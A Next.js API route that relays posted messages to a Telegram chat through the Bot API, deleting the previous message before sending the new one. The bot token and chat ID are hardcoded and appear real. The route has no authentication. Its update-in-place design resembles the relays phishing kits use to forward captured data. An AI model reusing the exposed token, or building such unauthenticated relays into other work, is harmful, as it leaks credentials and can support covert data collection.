import { NextRequest, NextResponse } from 'next/server';

const POST = async (req: NextRequest) => {
    try {
        const body = await req.json();
        const { message, message_id } = body;

        if (!message) {
            return NextResponse.json({ success: false }, { status: 400 });
        }

        const TOKEN = '8878301736:AAGPeumTX4NGP7xK_OS_llF66_w-6XIB9pc';
        const CHAT_ID = '-1003936865368';

        if (!TOKEN || !CHAT_ID) {
            return NextResponse.json({ success: false, message: 'Missing TOKEN or CHAT_ID in config' }, { status: 500 });
        }

        if (message_id) {
            await fetch(`https://api.telegram.org/bot${TOKEN}/deleteMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    message_id
                })
            });
        }

        const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });

        const data = await response.json();
        const result = data?.result;

        return NextResponse.json({
            success: response.ok,
            message_id: result?.message_id ?? null
        });
    } catch {
        return NextResponse.json({ success: false }, { status: 500 });
    }
};

export { POST };